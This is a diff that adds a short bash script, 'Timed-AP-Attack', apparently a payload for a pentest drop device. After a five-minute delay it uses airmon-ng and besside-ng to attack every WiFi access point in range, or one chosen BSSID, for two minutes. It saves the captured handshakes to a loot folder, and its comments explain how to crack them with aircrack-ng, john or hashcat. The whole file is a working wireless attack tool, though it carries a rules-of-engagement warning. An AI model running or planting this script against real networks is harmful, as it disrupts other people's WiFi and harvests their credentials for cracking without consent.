@@ -1,0 +1,75 @@
+#!/bin/bash
+#Copyright(C) 2020  saintcrossbow@gmail.com
+#
+#This program is free software: you can redistribute it and/or modify
+#it under the terms of the GNU General Public License as published by
+#the Free Software Foundation, either version 3 of the License, or
+#(at your option) any later version.
+#
+#This program is distributed in the hope that it will be useful,
+#but WITHOUT ANY WARRANTY; without even the implied warranty of
+#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
+#GNU General Public License for more details.
+#
+#You should have received a copy of the GNU General Public License
+#along with this program.If not, see<http://www.gnu.org/licenses/>
+
+# Title: Timed-AP-Attack
+# Description: Starts an aggressive AP attack after n seconds, stops after n seconds, and then shuts down
+# Based on Signal Owl timed mine
+
+# Careful since not nicest thing to do and aggressive.
+# Check your RoE and ensure you do not get collateral damange
+# -b  Attack a specific BSSID
+# -W  Attack only WPA
+# -c  Lock on specific channel
+# Once complete, the capture files are in the /root/loot directory. Extract using:
+#   aircrack-ng -J filebase capturefile.cap
+# After that crack the hash using john or hashcat
+
+# Short fuse: starting in 5 minutes
+START_IN=300
+# Gather for 2 minutes
+GATHER_FOR=120
+# Leave blank if you want to attack all APs
+TARGET_BSSID=""
+
+echo "|_  Starting in $START_IN seconds, gathering for $GATHER_FOR seconds"
+if [ -z "$TARGET_BSSID" ]
+then
+  echo "|_  Attack all in range"
+else
+  echo "|_  Attack only $TARGET_BSSID"
+fi
+
+echo "[*] Starting monitor mode for external WiFi adapter"
+airmon-ng start wlan1 1> /dev/null
+
+sleep $START_IN
+
+echo "[*] Starting attack"
+
+if [ -z "$TARGET_BSSID" ]
+then
+  echo "[*] Attacking all APs in range..."
+  besside-ng wlan1mon &
+  bpid=$!
+else
+  echo "[*] Attacking only $TARGET_BSSID..."
+  besside-ng -b $TARGET_BSSID wlan1mon &
+  bpid=$!
+fi
+
+sleep $GATHER_FOR
+
+echo "[*] Stopping attack"
+kill $bpid
+wait $bpid
+
+mv besside.log /loot
+mv *.cap /loot
+sync
+
+airmon-ng stop wlan1mon
+
+echo "[*] Complete"
